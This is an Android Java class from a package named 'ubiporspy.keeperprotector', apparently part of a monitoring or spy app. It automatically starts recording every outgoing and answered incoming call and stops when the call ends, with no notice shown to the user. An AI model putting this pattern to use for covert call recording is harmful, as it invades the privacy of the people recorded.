package com.ubiporspy.keeperprotector.main.broadcasts;

import android.content.Context;

import com.ubiporspy.keeperprotector.manager.CallRecorderManager;

import java.util.Date;

/**
 * Broadcast principal para detectar llamadas.
 */

public class BroadcastCastCallMain extends BroadcastCallHelper {

    private CallRecorderManager manager;

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, Date start) {
        super.onOutgoingCallStarted(ctx, number, start);

        manager = new CallRecorderManager(ctx, number);
        manager.startRecording();
    }

    @Override
    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end) {
        super.onOutgoingCallEnded(ctx, number, start, end);

        if (manager != null) {
            manager.stopRecording();
        }
    }

    @Override
    protected void onIncomingCallAnswered(Context ctx, String number, Date start) {
        super.onIncomingCallAnswered(ctx, number, start);

        manager = new CallRecorderManager(ctx, number);
        manager.startRecording();
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end) {
        super.onIncomingCallEnded(ctx, number, start, end);

        if (manager != null) {
            manager.stopRecording();
        }
    }
}
